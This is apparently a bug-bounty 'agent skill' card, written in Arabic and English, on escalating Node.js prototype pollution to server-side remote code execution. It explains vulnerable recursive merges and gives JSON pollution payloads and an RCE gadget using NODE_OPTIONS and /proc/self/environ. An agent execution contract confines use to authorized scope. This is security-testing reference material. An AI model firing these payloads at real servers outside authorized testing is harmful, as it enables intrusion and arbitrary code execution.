# SKILL: Prototype Pollution — من Client-Side لـ Server-Side RCE (Node.js)

**Skill id:** `tip/prototype-pollution-من-client-side-لـ-server-side-rce-nodejs`  
**Category:** RCE, API Hacking  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/d849ccd9471a449f90e625c477108705  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **RCE, API Hacking**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

لو الباكيند Node.js بيعمل recursive merge/extend لـ JSON من المستخدم من غير تنظيف، تقدر تلوّث Object.prototype لكل الأوبجكتس. التأثير بيتدرّج من DoS لـ property injection لحد RCE لو لقيت gadget مناسب (زي NODE\_OPTIONS أو child\_process spawn params). ادور على endpoints بتاخد JSON وتعمل ليه merge (settings/config/import).

## Payload / Code

```
// JSON body لـ endpoint بيعمل merge/clone
\{"proto":\{"polluted":"yes"\}\}
\{"constructor":\{"prototype":\{"polluted":"yes"\}\}\}
// gadget لـ RCE في Node:
\{"proto":\{"argv0":"node","shell":"/proc/self/exe","NODE\_OPTIONS":"--require /proc/self/environ"\}\}
// اكشف التلوث: رد status/JSON بيتغير لما تبعت proto
```

## Source

PortSwigger / vux06 BB-Methodology — Server-Side Prototype Pollution

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
